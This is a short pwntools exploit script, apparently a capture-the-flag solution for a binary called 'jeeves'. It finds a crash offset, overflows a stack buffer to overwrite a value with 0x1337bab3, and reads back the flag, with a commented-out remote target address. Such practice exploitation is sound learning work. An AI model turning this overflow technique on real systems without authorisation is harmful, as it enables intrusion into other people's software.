from pwn import *

def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('Hello, good sir!', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.rbp)
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset

# Set up pwntools for the correct architecture
exe = './jeeves'
context.encoding = 'utf8'
# This will automatically get contect arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'


##### EXPLOIT #####

# Pass in pattern size, gt back EIP offset
#offset = find_eip(cyclic(1000))

# Start program
io = process()
#io = remote('178.128.168.198', 32366)

# Build the payload
payload = flat({
    60: 0x1337bab3
})

# gdb.attach(io, gdbscript='''
# init.pwndbg
# ''')

# Save the payload to file
write('payload', payload)

# Send the payload
#io.sendline(payload)   use for remote
io.sendlineafter('Hello, good sir!', payload)
io.recvuntil("* have a good day!")

# Get the flag
flag = io.recv()
success(flag)
